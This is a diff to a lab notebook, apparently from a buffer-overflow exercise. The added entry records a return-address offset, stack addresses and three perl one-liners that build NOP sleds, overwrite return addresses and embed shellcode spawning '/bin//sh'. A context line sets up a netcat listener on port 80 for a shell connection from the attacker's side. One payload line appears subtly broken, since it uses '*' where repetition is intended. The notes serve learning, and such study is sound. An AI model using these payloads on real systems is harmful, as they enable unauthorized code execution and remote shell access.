@@ -83,6 +83,31 @@ xcd\x80
 * Netcat from other (attacker) terminal needs to be turned on for shellcode to work.
 ```sh
 nc -lvp 80
+
+
+### 2023-01-31 
+* By using BOF pattern generator discovered return address offset is **44**.
+
+* Generate exploit
+    * return address is **0x080485c4**
+    * return address is \xc4\x85\x04\x08
+    * return to shell  code is \xd0\xf1\xff\xbf
+    * Beginning of buffer is 0xbffff190
+    * Beginning of buffer is \x90\xf1\xff\xff\xbf
+
+* After return address
+```sh
+perl -e 'print "\x90"x44,"\xd0\xf1\xff\xbf"x5,"\x90"x10,"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89","\xe1\xcd\x80\x90"' > badfile && cat badfile
+```
+
+* Before return address
+```sh
+perl -e 'print "\x90"x4,"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89","\xe1\xcd\x80\x90", "\x90\xf1\xff\xff\xbf"*10' > badfile && cat badfile
+```
+
+* Shell code only
+```sh
+perl -e 'print "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68","\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89","\xe1\xcd\x80\x90"' > badfile && cat badfile
 ```
 
 ### TODO
